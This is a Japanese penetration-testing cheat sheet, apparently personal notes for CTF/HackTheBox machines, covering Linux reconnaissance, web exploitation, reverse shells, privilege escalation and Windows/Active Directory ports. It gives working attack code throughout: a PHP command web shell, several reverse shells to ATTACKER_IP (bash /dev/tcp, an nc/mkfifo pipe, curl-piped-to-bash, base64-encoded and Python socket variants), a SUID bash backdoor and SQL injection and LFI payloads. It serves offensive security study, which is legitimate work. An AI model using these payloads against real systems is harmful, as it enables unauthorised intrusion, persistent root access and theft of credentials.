# Linux

## 初期調査

- nmapによるポートスキャン
	- [[Penetration Knowledge#Practice(nmap)]]
- gobuster / feroxbuster / wfuzzなどによるディレクトリ・サブドメイン調査
	- [[Penetration Knowledge#Practice(dirscan)]]
- CMSが使われている場合はdroopescanやwigやnmapの `http-wordpress-users` で調査
- 攻撃元の `/etc/hosts`を編集して攻撃先のIPとホスト名を対応付ける
- burpのtargetタブでマッピングを確認。未知のファイルやディレクトリを発見できる可能性
- 404などのエラーページの文言を検索してCMSなどの種類を特定できる可能性
- HTMLレスポンスのヘッダに使用されているフレームワークの情報が入っている場合があるのでburpやブラウザのデベロッパーツールで確認
- wordpressなどのCMSを用いたwebサイトで明らかに何かしらのプラグインを用いた機能(イベントスケジューラなど)がある場合はソースコードを確認してみるとプラグイン名やバージョンが分かる可能性がある
    - wpscanでは検知できないプラグインが見つかる可能性もある
    - `/wp-content/plugins` に手動でアクセスしてみると使用しているプラグインが確認できることがある( `plugins` ディレクトリに `index.php` がない場合のみ可能)
    - `wpscan` で `--plugins-detection aggresive` にするとより詳細にプラグイン一覧を取得できる可能性があるが、実行に数十分かかる可能性がある
    - プラグインのワードリスト( `/usr/share/seclists/Discovery/Web-Content/CMS/wp-plugins.fuzz.txt` )を使ってファジングしたほうが早いが、完全ではない
- DNSサーバにアクセスできる場合はゾーン転送ができる可能性
    - サブドメインの情報を収集できる可能性

## ユーザ権限奪取
- webページのソースコード(HTML)は必ずざっと目を通しておく
- リダイレクトされる場合はBurpで流れを確認してEARの有無を検証
    - リダイレクトのレスポンスのサイズが大きい場合はEARの可能性が高い
    - Burpのresponse interceptionを有効にしておく
- HTBの場合はwebページ上に `.htb` ドメインがある場合はとりあえず `/etc/hosts` に追加しておいたほうがいいかも
- ユーザの入力をwebページ上に表示しているフォームなどがある場合はXSSやSSTIの可能性
    - SSTIの場合は当該webページの言語やフレームワークによって適切なペイロードが存在するのでHackTricksなどを確認
- CMSやフレームワークのデフォルトパスワードを調べてみる
    - デフォルトのクレデンシャル情報が見つかった場合はSSHでも利用してみる
- CMSやOSやサーバのバージョン情報を基にCVEやmetasploitのexploitコードを探す
    - Log4jなどの有名な脆弱性と特定のCMSやOSのバージョンを組み合わせたPoCがあったりする
    - `curl CMS_URL | grep version` のようなコマンドでバージョン情報を探してみる
    - PoCのコードをそのまま実行してもうまくいかない場合はコードの処理をよく読んで必要に応じて改変してみる
        - CVEで調べていろいろな記事を読んだりする
- cpaファイルがある場合は `capsinfo` や `tshark` コマンドを使って概要を把握したうえで、無線LAN情報がある場合はSSIDを確認しておく。 `aircrack-ng` コマンドを使うとcpaファイルから無線LANのパスワードを解読することができる。
- CMSやwebシェルやデータベースのパスワードが使い回されている可能性を考慮
    - 攻撃元から直接SSHできなくてもwebシェル獲得後にsuコマンドで水平移動できる可能性
- HTTPが使える場合はブラウザでアクセスして調査
    - ディレクトリトラバーサルやインジェクションの隙を探す
        - OSコマンドインジェクションの場合、**シェル獲得後のみ**インジェクションの成功の確認に `whoami` などの出力以外に `sleep` コマンドを用いて任意の秒数レスポンスを遅延させ、通常時との差を測るのも有効
        - OSコマンドインジェクションは任意の値の後ろに `; 任意のコマンド` を入力して確かめてみる
        - SQLインジェクションを試す場合はCookieとかの設定が面倒なのでBurpでリクエストをキャプチャしてファイルに落としてsqlmapを使うと楽
            - SQLインジェクションの脆弱性検証の第一手は `test' or 1=1; -- -` など
            - フォームがあったら毎回とりあえず `'` を入力してみてもよいかも
                - `'` がないパターンも試してみる
                - 500エラーが返ってきたらSQLのクエリがクラッシュしている(=サーバ側のエラー)と考えて良いかも
            - フォームのcookieなどの都合でsqlmapでファイル書き込みやOSコマンド実行ができない場合でも手動でcookieを編集しながら行うとうまくいく場合があるので試してみる
            - UNIONインジェクションが可能かつPHPのアプリケーションの場合のみ `INTO OUTFILE` を用いて任意のファイルを書き込むことができる
    - SQLインジェクションの脆弱性がある場合はDBの読み取りだけでなく `--os-shell` オプションや `--privileges` オプションも試してみる
        - `FILE` 権限がある場合は `—file-read` オプションでサーバ上のファイルを読み取り可能
    - SQLインジェクションでDBにアクセスできた場合、パスワードなどの認証情報以外にセッションIDを探してみる(ログインをバイパスできる可能性)
- ディベロッパーツールでソースコードを確認
- CMSが使われている場合は種類やバージョンを確認
- 怪しい画像などはダウンロードして静的解析
- 怪しい文字列はユーザ名・パスワードだけでなくファイル・ディレクトリ・パスとしても試してみる
- FTPが使える場合はブラウザからアクセス可能なディレクトリ( `/var/www` など)にwebシェルをアップロードできる可能性がある
    - 権限がなく当該ディレクトリにアップロードできない場合は `/tmp` などを経由
- リバースシェルで攻撃元の任意のポートにアクセスできない場合は80や443などFWで許可されている可能性の高いアウトバウンド通信の接続先ポートにしてみる
- リバースシェルでターゲットからのインバウンド通信を捉えることができてもシェルが動作しない場合はリバースシェルを起動する他のコマンドを試してみる
- ブラウザのURL内のパスに注目して試行錯誤してみる
    - 拡張子
    - クエリ
        - コマンドを入力してみる
    - ディレクトリトラバーサル
    - php://filterの利用によるphpソースコードの参照
        - 脆弱性のある関数やロジックなどを探す
        - ファイルアップローダを利用したwebシェルの送信など
- 既に誰かが設置した怪しいphpファイルなどがある場合は利用する
    
    - URLクエリをファジングしたパラメータの特定
- ファイルアップローダがある場合はシェルを埋め込んだファイルをアップロード
    
    - phpのwebアプリにおいてMIMEチェックを行っている場合はPHPシェルスクリプトの先頭にGIFやPNGのマジックバイトを挿入することでチェックをバイパスできる可能性
- webシェル奪取後、SSHを利用したユーザシェル奪取
    
    - ユーザディレクトリ内にsshディレクトリが存在する場合は秘密鍵ファイルを取得し、攻撃元端末からSSHアクセス(sshコマンドの引数に秘密鍵ファイルを指定する)。必要に応じてjohnで秘密鍵に設定されたパスフレーズを解析する。
- wordpressの場合は `/phpmyadmin` ディレクトリも試してみる
    
- wordpressが使われている場合は `wpscan` などのwordpress専用のスキャンコマンドを使ってみる
    
    - `-e` オプションを付けてプラグイン・ユーザ名・ファイルなどを列挙するのを忘れずに
        - ユーザ名はwebページ上の記事にも載っている可能性
- wordpressなどのCMSでユーザ名が判明したらhydraなどを用いてSSHにオンラインパスワードクラック
    
- wordpressにログインできたらpluginにwebシェルの設置ができる
    
    - [https://github.com/p0dalirius/Wordpress-webshell-plugin](https://github.com/p0dalirius/Wordpress-webshell-plugin) (管理者権限が必要)
    - hacklabのdeathnoteで用いたシェル
- wordpressの管理画面から任意のページ(404など)にリバースシェルを設置することもできる
    
    - [https://github.com/pentestmonkey/php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell)
- exploitコードを利用する場合はできるだけコードを読んで変数の値などを環境に応じて変更する必要がないかどうか確認
    
    - javascriptファイルの場合ブラウザのディベロッパーモードでファイルのコードを一行ずつ入力してデバッグができる
- URLを入力するフォームがあったらXSSやSSRFを疑う
    
    - SSRFの場合はURLに攻撃元マシンのIPアドレスと開放された任意のポートを指定して検証
        - nmapでfilteredとなっているポートを利用できる可能性
        - 脆弱性があると判明した場合はlocalhost(ターゲットマシン)の空いているポートがないか `burp` や `ffuf` などを用いて調べる
    - 格納型XSSが利用できる場合は管理者側のCookieの取得を試みる
- 何かしらのセッションIDなどのクレデンシャル情報を取得できた場合はCookieにセットしてログインをバイパスできる可能性
    
    - Cookieの文字列の長さや形式などをBurpなどを用いて事前に把握しておく
- ディレクトリスキャンで `.git` ディレクトリが見つかった場合は `git-dumper` などを利用してみる
    
- ローカルファイルインクルージョン(LFI)の脆弱性がある場合は `/etc/passwd` や `/.htaccess` や `.htpasswd` や `/etc/hosts` ファイルを探してみる
    
    - `/etc/hosts` にサブドメインの情報や攻撃対象のローカル(localhost)でホスティングされているサービスがある可能性
- ターゲットでApache2が用いられている場合、configファイルのデフォルトのパスは `/etc/apache2/sites-enabled/000-default.conf`
    
- ターゲットが何かしらの形で認証サービスを提供している(webのフォームやAPIなどなんでも)場合はバックエンドに何かしらのデータベースがある可能性が高いのでSQLインジェクションを試みる
    
- 以下の条件を満たすシェルはdockerコンテナ内の可能性がある
    
    - ホスト名がランダムな16進数
    - `ip` , `ifconfig` , `ping` などの基本的なコマンドが使えない
    - ルートディレクトリに `.dockerenv` ファイルがある
- dockerコンテナ内の場合は `ifconfig` や `ip route` コマンドが使える場合は実行して別のホストやネットワークへの足がかりがないか探す(中継攻撃, pivoting)
    
    - `ifconfig` では現在侵入しているホストやサーバのIPアドレスを確認できる
    - `ip route` ではデフォルトゲートウェイを確認できる
    - nmapでfiltered状態のポートにアクセスできないか試してみる
    - docker環境内でホストマシンのIPに対してポートスキャンを実行し開放ポートを特定する
    - `ls -la` の出力で通常ユーザ名やグループ名が表示されているところにIDのみ表示されている場合は外部のディレクトリがマウントされている可能性がある
        - `mount` コマンドでマウントされているディレクトリを探してみる
    - root権限の場合は `/etc/shadow` を見ることができる
- NodeJSのフレームワークであるExpressが使われている場合はHTTPリクエストのContent-Typeに `x-www-form-urlencoded` だけでなく `json` もサポートしているので必要に応じて確認してみる
    
    - 使用されているデータベースはPosgreSQLやMongoDBの場合が多い。後者はNoSQLなのでログインのHTTPリクエストのJSONデータを編集してNoSQLインジェクションができる可能性
- ユーザの入力をもとに動的にPDFを生成しているwebサービスでは任意のHTMLタグを埋め込んでLFIができる可能性
    
- webサービスをホスティングしているサーバのディレクトリ構成が知りたい場合はリクエスト中に意図的にエラーを引き起こすような値を含めてエラーメッセージ中に表示されるパスなどを取得するのが有効
    
- NodeJSのフレームワークを用いたwebサービスではビルド時に当該フレームワークの文法で書いたスクリプトは `index.js` のようなファイルに変換される事が多い
    
- `/etc/hosts` にサブドメインの情報がある可能性
    
- nginxのサーバの場合は `/etc/nginx` ディレクトリ内にサブドメインなどの情報がある可能性
    
    - `/etc/nginx/sites-enabled` ディレクトリや `/etc/nginx/sites-available` ディレクトリ
- 怪しいファイルは `file` や `strings` や `exiftool` コマンドで静的解析
    
    - その後 `ltrace` で動的解析
- wordpressに関する脆弱性情報は[WPScanのwebサイト](https://wpscan.com/)にまとまっている
    
- wordpressのwebサイトの場合は `wp-config.php` の取得を試みる
    
- 何かしらの形で `.htaccess` を編集できる場合はwebシェルを設置できる可能性がある
    
- Spring Bootなど、Javaフレームワークを用いたwebサーバの場合は [`MainContoroller.java`](http://MainContoroller.java) というファイルにクレデンシャル情報がある可能性
    
- nginxやapacheなどサーバのソフトウェアが判明している場合はディレクトリ構成を調べてconfigファイルを取得する
    
- PHPを用いたwebページでURLのパラメータでページを指定している場合はphp filterでソースコードを確認したりLFIの脆弱性の可能性がある
    
    - 脆弱な実装だとLFIの回避策としてパラメータ中の `../` をトリミングしている可能性があるが、 `....//` で回避可能
- pythonの `os.path.join()` では引数に `/` で始まる文字列が取られると当該文字列の引数より前の引数をすべて無視するのでLFIに利用可能な可能性
    
- LFIが可能かつ内容不明の開放ポートがある場合は `/proc/{PID}/cmdline` ファイルをブルートフォースしてポートの内容を特定できる可能性
    
- cookieの文字列にパターンがないか調べてみる(ユーザの入力をハッシュ化しているなど)
    
- 何かしらのテンプレートなどではないシンプルなページの場合はJSファイルを確認してみる
    
- 難読化されたjavascriptのファイルをディベロッパーモードなどから読み込める場合はJS beautifierなどを使って解読してライブラリやフレームワークなどを特定してみる
    
- 本来認証後にしかアクセスできないであろうページに認証前にアクセスしてリダイレクトされる場合はEAR脆弱性がないかBurpのTargetタブなどで確認
    
- ユーザの入力をもとに何かしらの処理をする機能がある場合は裏で動いているコマンドを想像してみる
    
    - OSコマンドの実行やDBへのアクセスなど
    - 推測したコマンドの脆弱性を調べてみる
- ログイン/サインイン部分はBurpでリクエスト/レスポンスのパラメータをチェック
    
- 何らかの形でログにアクセスできる場合は `grep -ri passw DIRECROTY_PATH 2>/dev/null` などを実行してパスワードを入力したログがないか調べてみる( `passwd` と `password` 両方調べるため)
    
- パスワード付きのzipファイルがある場合は `base64 -w0` エンコードしてローカルでデコードしてjohn2zipなどを用いてクラックする。
    
- ファイルの所有者に注目。目的のユーザの場合は要チェック。
    
- cewlを使ってwebページのコンテンツを基にワードリストを作ってみる
    
- `/var/www` 内のディレクトリにファイルを書き込むことができる場合はwebシェルを作成してリバースシェルを取得できる可能性
    
- rockyouから特定のワードをgrepで抽出して新しいワードリストを作成してみる
    
- 怪しい名前のファイルやコマンドがある場合はマニュアルを検索してみる
    
- 怪しいPHPやpythonやrubyのスクリプト内で変数を基にOSコマンドを実行する処理がある場合はOSコマンドインジェクションの可能性
    
- シェルアップグレードの手順は以下
    
    1. `python -c 'import pty;pty.spawn("/bin/bash")'`. `python3` works as well.
    2. Ctrl-z to background shell. At local prompt, `stty raw -echo`.
    3. `fg` to bring shell back to front.
    4. `reset` to reinitialize the terminal. If prompted for Terminal type, enter `screen`.
    5. In reset shell, `export TERM=screen`.
- 16進数データ化された圧縮ファイルの解凍はCyberChefの `Detect File Type` を使うと簡単
    
    - [https://0xdfimages.gitlab.io/img/curling-cyberchef.gif](https://0xdfimages.gitlab.io/img/curling-cyberchef.gif)
- phpinfo()の結果が出力されているページにアクセスでき、 `file_uploads = on` となっている場合はリバースシェルを構築可能
    
    [LFI2RCE via phpinfo() - HackTricks](https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/lfi2rce-via-phpinfo.html)
    
- 名前のついている有名な脆弱性などはsearchsploitでexploitを検索
    
- hexやbase64エンコードされた秘密鍵などをデコードして復元する際は改行の位置や空白に注意
    
- Java archive ( `.jar` )ファイルをデコンパイルして解読するには `jd-gui` というツールが有効
    
- プラグインやソフトウェアについて調べるときは当該ファイルのMD5ハッシュ値をGoogleで調べると有効な可能性
    
    - `md5sum FILE_NAME`
- SSL/TLSを使用しているwebサイトにブラウザやペイロードスクリプトでアクセスできない場合はTLS/SSLの有効なバージョン設定を確認
    

## リバースシェル

- 通常のリバースシェルのコマンドがうまく実行できない場合
    - base64エンコードしてデコードしてみる
    - リバースシェルを起動するシェルスクリプトファイルをローカルに作成してcurlでターゲット側からダウンロードして実行させる

## 1

以下のような `shell.php` を作成し、攻撃対象のサーバにアップロード。ただしブラウザ上でアクセスできる場所にすること。

```php
<?php echo system($_GET["cmd"]); ?>
```

任意のポートを開放。

```bash
nc -nlvp 2222
```

以下のような [`shell.sh`](http://shell.sh) を作成し、任意のディレクトリに保存。

```bash
#!/bin/bash
bash -i >& /dev/tcp/<YOUR_IP_ADDRESS>/2222 0>&1
```

当該ディレクトリでwebサーバを起動。

```bash
python3 -m http.server 8080
```

ブラウザ上で以下のURLにアクセス。

```bash
http://TARGET_URL/PATH/shell.php?cmd=curl%20ATTACKER_IP:8080/shell.sh|bash
```

## 2

1の `shell.php` の設置・ポート開放後、ブラウザ上で以下のURLにアクセス。

```bash
http://TARGET_URL/PATH/shell.php?cmd=rm+%2Ftmp%2Ff%3Bmkfifo+%2Ftmp%2Ff%3Bcat+%2Ftmp%2Ff%7C%2Fbin%2Fsh+-i+2%3E%261%7Cnc+ATTACKER_IP+2222+%3E+%2Ftmp%2Ff
```

## 3

リバースシェルを起動するシェルスクリプトファイルを作成

```bash
echo -e '#!/bin/bash\\nsh -i >& /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0>&1' > rev.sh
```

当該ファイルを作成したディレクトリでwebサーバを起動

```bash
python3 -m http.server 8080
```

ポート開放

```bash
nc -lvnp ATTACKER_PORT
```

シェルスクリプトをダウンロードして実行するスクリプトをターゲットに何かしらの方法で実行させる

```bash
bash -c 'curl ATTACKER_IP:8080/rev.sh' | bash
```

## 4

空白文字など何かしらの影響でリバースシェルが起動しない場合はbase64エンコードしてみる。

```bash
# bash -i >& /dev/tcp/10.10.14.10/2222 0>&1
echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMC8yMjIyIDA+JjE= | base64 -d | bash
```

## 5

以下のシェルスクリプト( [`shell.sh`](http://shell.sh) ) をローカルに作成。

```bash
bash -i >& /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0>&1
```

ローカルでHTTPサーバを立ち上げる。

```bash
python3 -m http.server 8000
```

何かしらの方法でローカルのシェルスクリプトをターゲットにダウンロードして保存させる。

```bash
curl ATTACKER_IP:8000/shell.sh -o /tmp/shell.sh
```

何かしらの方法で実行権限を与え、シェルスクリプトを実行させる。

```bash
chmod +x /tmp/shell.sh
/bin/bash /tmp/shell.sh
```

## 6

pythonを用いてリバースシェルを起動する。

```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.13",1111));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

## root権限奪取

- 一番最初に `.bash_history` を確認
    
- `id` コマンドでユーザの属しているグループを確認
    
    - findコマンドで当該グループの権限を有するファイルを確認
    - 権限昇格の手がかりがないかグループ名で検索
    - 色々なグループに所属している場合はとりあえず全部[HackTricks](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/interesting-groups-linux-pe/index.html?highlight=staff#staff-group)で検索
- `sudo --version` でバージョンを特定して脆弱性を探す
    
- `uname -a` でOSのバージョン特定
    
    - OSとカーネルのバージョン両方について脆弱性を調べておく
- `sudo -l` でroot権限やsudoで利用可能なコマンドの確認・GTFOBinsの利用
    
    - `env_keep+=LD_PRELOAD` となっている場合は[こちらの手法](https://www.notion.so/2aadb85a7f7b4d26b5ed0e9247082613?pvs=21)を試す
    - `SETENV` タグが付いている場合は当該コマンドの実行時に任意の環境変数をセットすることができる
    - 怪しいコマンドが載っている場合は `file` コマンドや `strings` コマンドを用いて静的解析
    - あるいは実際に実行して動的解析
    - sudoで実行可能なコマンドのバージョンを調べて脆弱性を探してみる
    - 許可されたコマンドの引数にワイルドカードが含まれている場合は相対パスを用いて任意のディレクトリに存在するファイルを実行できる可能性
- `/etc/exports` を確認して `no_root_squash` オプションの付いたディレクトリを探す
    
- `/etc/passwd` ファイルを確認してユーザ一覧を把握
    
- `/etc/sudoers` ファイルを確認して管理者権限で実施できるコマンドを確認
    
- `/etc/crontab` を確認してroot権限で提示実行されているjobを探す
    
- `/etc/hosts` を確認してサブドメインを探す
    
- `getcap -r / 2>/dev/null` コマンドを実行して利用できる可能性のあるcapabilitiesを探す
    
- `netstat -ntlp` コマンドを用いて内部で開放されているポートを確認
    
    - ブラウザ上で確認できる開放ポートがあったらkali上で `ssh -L TARGET_PORT:127.0.0.1:ARBITRARY_PORT TARGET_NAME@TARGET_PI` コマンドを実行してポートフォワードして確認してみる。
        - ローカルのブラウザでフォワードしたポートにアクセスできない場合はローカルの `/etc/hosts` に127.0.0.1とホスト名を対応付ける設定を追加
    - SSHが利用できない場合はchiselを使う
    - 簡単に開放ポートの内容を知りたい場合は侵入先でlocalhostと当該ポートを指定してcurlを実行
    - DBなどの場合はユーザシェルからコマンド実行して接続してみる
- `find` でSUIDのついたファイルの確認
    
    - 見慣れないファイルがある場合は要チェック
        - linpeasで `Unknown SUID binary` となっているファイルは要チェック
        - コードを読んでみて相対パスでコマンド実行していないかなどを確認
        - 静的解析や動的解析
            - `strings` や `ltrace` など
                - `ltrace` の場合 `scp` などでローカルに持ってきて検証したほうがよい。base64エンコードでコピーしたファイルは実行できない場合がある
- `find` でユーザ所属グループの権限のついたファイルの確認
    
- `find`でフルパーミッション (アザーパーミッション)のあるディレクトリを探す。例えば `/var/www` ディレクトリ内のディレクトリがユーザ権限で書き込み可能な場合で所有者がrootの場合は webシェルを設置してブラウザ経由でアクセスできる可能性がある
    
- `find -type f -writable -ls` で書き込み可能なファイルを探す
    
- ディレクトリスキャンで403となっていたファイルの中身を `/var/www/html` ディレクトリから確認
    
- `/opt` ディレクトリなど、ルートディレクトリ直下の主要なディレクトリにも目を通して怪しいファイルがないか確認
    
- `ps auxww | grep root` でroot権限で現在実行されているプロセスを調べる
    
    - `bash` コマンドで何かしらのシェルスクリプトを実行しているのは怪しい
        - linuxの非デフォルトコマンドがroot権限で実行されるスクリプト内で利用されている場合は要注目
        - コマンド名とバージョンで脆弱性を探す
- `pspy` を実行してしばらく放置してroot権限で実行されているcronjobを探してみる
    
    - SSHログイン/ログアウトなどの特定のイベント時にのみ発生するjobがある可能性
    - cronjobで用いられているコマンドやライブラリがあればその脆弱性を調べる
- 管理者権限で定期実行されるファイルを編集してリバースシェルを呼び出すコードを追加・リバースシェルを作成して `/tmp`ディレクトリなどに追加(実行権限も付与しておく)
    
- 怪しいファイルがある場合は `file` コマンドや `strings` コマンドを利用して情報収集
    
- 怪しいファイルは一回動かしてみる
    
    - ユーザの入力を受け付ける処理がある場合はコマンドを挿入してみる
- 環境変数PATHの先頭に任意のスクリプトまたは実行権限のあるコマンドと同名のスクリプトを配置したディレクトリを追記
    
- LinPEASの利用
    
    - 直近で編集されたファイルや書き込み可能なファイルなどに注目
        - pspy64で監視しているプロセスと同じものがないか確認
- `/etc/passwd` が編集可能な場合はroot権限のユーザを追加
    
- `/var/www` 内のファイルは重点的に捜索
    
    - PHPやSQLが使われている場合はクレデンシャル情報が平文で保存されているはず
    - 特にconfig関係のファイルなど
    - configファイルなどからDBの認証情報を捜索
- `gcc` や `cc` コマンドが利用できる場合はC/C++言語で書かれたExploitをコンパイルできる
    
- 怪しい実行ファイルがあるがその編集権限がない場合、そのファイル内で読み込まれているライブラリを書き変えてシェルを起動するコードを挿入する
    
- シェルスクリプト内で引数にクレデンシャル情報を入力してコマンド実行している場合は `pspy` でスプーフィングできる。
    
- SQLMAPを利用したシェルを利用している場合など、奪取したシェルのユーザのパスワードがわからない状態だと `sudo -l` などのコマンドを使うことができないので `/var/www/html` などを探すなどしてパスワードを探してみる\
    
    - プロセス一覧を調べてDBがある場合はDBへのアクセスを試みる
- CMSの種別がわかっている場合、そのCMSでデフォルトで使用されるデータベースの種類を調べてみる
    
    - ユーザーシェル獲得後、ユーザ権限で当該データベースを操作できる可能性がある
    - `ps aux | grep DB_NAME` でデータベースのプロセスやポートを確認
    - ユーザシェルが獲得できている場合はデータベースを編集できる可能性があるので以下の手段を試してみる
        - DBのパスワードハッシュを取得して解析
        - パスワードを攻撃者側で用意したものに変える(ハッシュ化されている場合はハッシュ化する)
        - 管理者権限を持つアカウントを追加する
- 特定のディレクトリ内のみにアクセスが限定されている場合はシンボリックリンクを利用して迂回できる可能性
    
- `/etc/sudoers` や `/etc/shadow` を編集できる場合は、任意のユーザに管理者としてのコマンド実行権限付与や、rootのパスワード削除または任意の値の設定ができる。
    
- `.git` ディレクトリが存在するディレクトリはGitレポジトリの可能性が高い
    
    - `git log` コマンドでコミット履歴を確認
    - `git show COMMIT_ID` コマンドでコミットの内容を確認
    - `git branch -a` コマンドで他のブランチがないか確認
- `.git` ディレクトリ内の `hooks` ディレクトリにはcommitやpushなどのタイミングで自動実行されるコマンドを定義するファイルがあるのでroot権限でgitの操作が行われている場合はこれらのファイルを編集してroot権限で任意のコマンドを実行できる可能性
    
- sudoであるスクリプトを実行可能なときはそのスクリプト内で用いられているライブラリを編集してシェルを埋め込むか、ライブラリの脆弱性を検索する
    
- 一般的にコマンドはカレントディレクトリで実行されるので、コマンド(シェルスクリプト)内の処理において相対パスが用いられている場合はカレントディレクトリが基準となる。
    
    - 相対パスで指定されたファイルと同名のファイルを書き込み権限のあるカレントディレクトリに作成して任意のスクリプトを実行できる可能性
- `grep -ri password PATH 2>/dev/null` などのコマンドで任意のディレクトリ内に `password` という文字列を含むファイルがないか調べることができる。
    
- 一般的ではない拡張子のファイルがある場合はその拡張子を用いるソフトウェアの脆弱性を探してみる
    
- jarは複数のjavaファイルをまとめてコンパイルした圧縮ファイルなので内容を把握したい場合は解凍するか、同じディレクトリにあるjavaファイルを読んで内容を把握する
    
    - XMLを読み込んでいる場合はXXE攻撃が成立する可能性
        - 相対パスを利用して `/tmp` などの任意のディレクトリにあるxmlファイルを読み込ませるなど
            - PHPのwebサービスの場合はphpfilterを用いてPHPのソースコードを確認できる可能性
                - [`file://`](file://) でサーバ上の任意のファイル
                - `php://filter/convert.base64-encode/resource=` でホスティングされているPHPファイルの中身を確認
                    - `/etc/hosts` を確認してローカルでホスティングされているサービスを確認(localhostなど)
- 何かしらの方法でroot権限でコマンドを実行できる場合、リバースシェルと同様の手順でrootシェルを獲得するか、bashをコピーしてSUIDを付ける方法がある
    
    ```bash
    # root権限で実行
    cp /bin/bash /tmp/kayu;chown root:root /tmp/kayu; chmod 4777 /tmp/kayu
    
    # 一般ユーザ権限で実行
    /tmp/kayu -p
    ```
    
- ディレクトリのrwx権限はあるが、当該ディレクトリ内のファイルのrwx権限がない場合、ファイルを編集するには以下の手順
    
    ```bash
    mv FILE .old
    cp .old /tmp/.old
    
    # /tmp/.oldを編集した後に実行
    cp /tmp/.old FILE
    ```
    
- pythonスクリプトファイル中で読み込まれているライブラリが書き込み可能な場合は以下のようなコードを追加してリバースシェルを構築
    
    ```bash
    import pty
    import socket
    import os
    
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(("IP_ADDRESS",PORT))
    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    pty.spawn("/bin/bash")
    s.close()
    ```
    
- 何かしらの方法で `/root/.ssh` ディレクトリ内の秘密鍵を取得する
    
- コアダンプからクレデンシャル情報を取得できる可能性
    
- user奪取の段階で探したcredentialが必要なexploitが利用できる可能性
    
- `lxd` グループに所属している場合は[こちらの方法](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation.html?highlight=lxd#method-1)で権限昇格が可能(alpineの方が簡単かも)
    
- pythonスクリプトを実行する際、 `import` 文によるライブラリのインポートは `sys.path` に定義されたディレクトリから行うが、これに加えて環境変数 `PYTHONPATH` で定義されたディレクトリからも行う。この環境変数の値を任意のディレクトリに書き変えてroot権限で実行されるpythonスクリプト内(あるいはroot権限で実行される任意の言語のスクリプトファイル内で読み込まれるpythonスクリプト)の `import` で利用しているライブラリと同名のファイル・関数を作成して任意のスクリプトを実行可能。
    
- 任意のシェルスクリプトにおいて `sudo` で実行されているコマンドが存在し、当該シェルスクリプトを実行した際にパスワードの入力を求められない場合は、`/etc/sudoers` ファイルなどの設定により、当該コマンドについて(のみ)パスワードの入力が省略されている可能性があるので同じコマンドをターミナルから `sudo` で実行可能
    
- `sudo` 権限で実行したコマンドが `less` コマンドのようなページャーを内部で使用している場合、 `!/bin/bash` を入力することでroot権限を獲得可能
    
- 自分が所有者であるディレクトリ内に自分の編集権限のないファイルが存在する場合は `rm` や `mv` などを用いて新しい同名のファイルを作成することで実質的に当該ファイルを編集可能
    
- マウントされたデバイスの一覧は `mount` または `lsblk`コマンドで確認可能
    
    - USBデバイスは通常 `/media` ディレクトリにマウントされる。
- 削除されたデータを復元する場合は当該データが存在するディスクを指定して `strings`や `grep -aPo`コマンドなどでバイナリデータからテキストを抽出する。 `grep` を用いる場合は正規表現を用いるとよい
    
    - `extundelete`や `testdisk`などのコマンドを用いても復元することができる可能性がある

# Windows

## 主要サービスのポート番号

### 基本プロトコル

|サービス名|プロトコル|ポート番号|説明|
|---|---|---|---|
|LDAP|TCP/UDP|389|ディレクトリサービスのクエリ|
|LDAPS (LDAP over SSL/TLS)|TCP|636|セキュアなLDAP|
|Global Catalog (GC)|TCP|3268|フォレスト全体のディレクトリ検索|
|Secure Global Catalog (GC)|TCP|3269|セキュアなGC|
|Kerberos 認証|TCP/UDP|88|認証プロトコル|
|DNS|TCP/UDP|53|名前解決サービス|
|NetBIOS Name Service|UDP|137|NetBIOS名解決|
|NetBIOS Datagram Service|UDP|138|NetBIOSデータグラム|
|NetBIOS Session Service|TCP|139|NetBIOSセッション管理|
|SMB (Server Message Block)|TCP|445|ファイル共有・認証|

### リモート管理関連

|サービス名|プロトコル|ポート番号|説明|
|---|---|---|---|
|RPC (Remote Procedure Call)|TCP|135|DCOM・RPCエンドポイントマッパー|
|WMI (Windows Management Instrumentation)|TCP|135|WMIによるリモート管理|
|WinRM (Windows Remote Management)|TCP|5985|HTTP経由のリモート管理|
|WinRM (Secure)|TCP|5986|HTTPS経由のリモート管理|

### Active Directory レプリケーション関連

|サービス名|プロトコル|ポート番号|説明|
|---|---|---|---|
|Active Directory Replication|TCP|135|ADデータの同期|
|DFSR (Distributed File System Replication)|TCP|5722|DFSレプリケーション|
|Netlogon|UDP|389, 464|認証関連|
|SMB (ADデータ同期)|TCP|445|レプリケーションに使用|

### その他

|サービス名|プロトコル|ポート番号|説明|
|---|---|---|---|
|NTP (Network Time Protocol)|UDP|123|時刻同期|
|RDP (Remote Desktop Protocol)|TCP/UDP|3389|リモートデスクトップ|
|DHCP (Dynamic Host Configuration Protocol)|UDP|67, 68|IPアドレスの自動配布|

## 初期調査

- nmapでポートスキャン
    - ポートが色々ある場合は以下の優先度で調べてみる
        - SMB: 読み取り可能な共有フォルダから何かファイルを取得できる可能性
        - LDAP: クレデンシャル情報なしでアクセスできるかどうか試してみる
        - Kerberos: ユーザ名でブルートフォースしてみて何かしらのユーザを見つけた場合はAS-REP Roasting攻撃を試してみる
        - DNS: ゾーン転送ができる可能性＆サブドメインのブルートフォース
        - RPC: anonymousアクセスの可能性
        - WinRM: 何かしらの方法でRemote Management Groupに所属しているユーザのクレデンシャル情報を取得済みの場合にシェルを獲得できる
    - Kerberos(88), LDAP(389), DNS(53), SMB(445)の組み合わせのポートがある場合はドメインコントローラである可能性が高い
        - ホスト名の部分をサブドメインとして登録しておくと良いかも
    - Kerberos, RPC, netbios-ssn, LDAP, winRMなどのドメインコントローラ関連のポートはクレデンシャル情報の発見後に調べる
    - nmapの結果にドメインコントローラなどのホスト名が出力されている場合がある
- SMB(445)がある場合は `crackmapexec` コマンドを使ってホスト名を確認
- `crackmapexec` を用いてSMBの共有フォルダを確認してみる
